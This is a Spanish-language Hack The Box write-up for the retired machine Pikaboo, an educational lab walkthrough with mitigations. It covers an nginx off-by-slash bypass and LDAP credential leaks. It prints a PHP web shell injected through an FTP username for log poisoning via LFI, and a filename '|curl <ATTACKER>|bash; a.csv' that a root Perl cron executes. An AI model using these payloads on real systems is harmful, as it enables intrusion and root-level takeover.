---
machine: Pikaboo
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, nginx, off-by-slash, lfi, log-poisoning, perl]
---

# Pikaboo — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Nginx tiene un `alias`/`proxy_pass` sin barra final y permite un off-by-slash hacia el panel de administración. El panel consulta LDAP y filtra credenciales de FTP; con ellas se envenena el log de vsftpd y se incluye por LFI para ejecutar PHP. Un cron root procesa CSV con Perl y `open`, y un archivo llamado `|comando;.csv` en el directorio de FTP se ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21/tcp` vsftpd, `22/tcp` OpenSSH en Debian y `80/tcp` nginx.
- `feroxbuster` encuentra `/admin.php` con `403` y `/images`.
- El servidor usa nginx delante de Apache; el panel admin se sirve por proxy.

## Enumeración

- `/admin../admin_staging/index.php` evade la regla de nginx y carga el panel.
- El panel permite consultar LDAP y devuelve contraseñas en base64 para `pwnmeow` y `binduser`.
- `pwnmeow` pertenece al grupo `ftp` y puede escribir en `/srv/ftp/*`.

## Foothold

Se entra por FTP como `pwnmeow`, se envenena el log con un PHP en el nombre de usuario y se incluye `/var/log/vsftpd.log` mediante el LFI del panel para ejecutar una reverse shell.

```bash
ftp <IP>
# usuario: <?php system($_GET['cmd']); ?>
curl 'http://<IP>/admin../admin_staging/index.php?page=/var/log/vsftpd.log&cmd=id'
```

## Movimiento lateral

La shell es `www-data`. El grupo `ftp` de `pwnmeow` permite escribir archivos en los directorios que procesa el cron; no hace falta otro usuario para la escalada.

## Escalada de privilegios

El cron `/usr/local/bin/csvupdate_cron` ejecuta un script Perl que abre `*.csv` con `open`. Un nombre que empieza por `|` ejecuta el resto como comando; se sube por FTP un archivo llamado `|curl <ATTACKER>|bash; a.csv` y el cron lo ejecuta como root.

```bash
ftp> put test.txt "|curl <ATTACKER>|bash; a.csv"
# esperar al cron y recibir la shell root
```

## Evidencia

- Off-by-slash `/admin../admin_staging/` y credenciales LDAP.
- Log de vsftpd envenenado y shell `www-data`.
- Archivo `|...;.csv` ejecutado por el cron root.

## Lecciones aprendidas

- Un `proxy_pass` sin barra final puede habilitar traversal.
- Los logs escribibles con entrada del usuario son un vector de LFI a RCE.
- Perl `open` con nombres de archivo permite inyección de comandos.

## Mitigación y detección

- Añadir barras finales y normalizar rutas en nginx.
- No incluir logs en páginas y sanear la entrada de FTP.
- Usar `open` con tres argumentos y listas explícitas en scripts Perl.

## Referencias

- [0xdf — Pikaboo](https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html)
- [IppSec — Pikaboo](https://www.youtube.com/watch?v=4tXFHoeOytE)
- [Hack The Box — Pikaboo](https://app.hackthebox.com/machines/pikaboo)
